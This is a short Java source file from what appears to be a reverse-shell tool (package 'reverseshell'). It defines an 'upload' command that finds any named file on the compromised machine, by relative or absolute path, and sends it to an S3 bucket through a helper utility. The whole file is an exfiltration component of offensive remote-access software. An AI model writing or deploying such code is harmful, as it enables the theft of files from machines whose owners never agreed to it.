package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.*;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class UploadToS3Command implements Command {



    @Override
    public String executeCommand(String command) {
        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
//        edge cases
        if (commands.get(0).equalsIgnoreCase("upload")){
            commands.remove(0);
            File fileToUpload = null;

            try {
                fileToUpload = getDesiredFile(String.join(" ", commands));

            }catch (Exception e ){
                return e.getMessage();
            }


            return S3UploadUtil.uploadToS3(fileToUpload) ;

        }
        return "there is a problem with the command" ;
    }

    private File getDesiredFile(String path){
        File relativeFile = new File(SystemCommandProxyUtil.currentWorkingDir, path);
        File absoluteFile = new File(path);
        File fileToUpload = null;



        if (relativeFile.exists() && relativeFile.isFile()) {
            fileToUpload = relativeFile;
        } else if (absoluteFile.exists() && absoluteFile.isFile()) {

            fileToUpload = absoluteFile;
        } else {
            throw new RuntimeException("File not found: ");
        }
        return fileToUpload;

    }





}
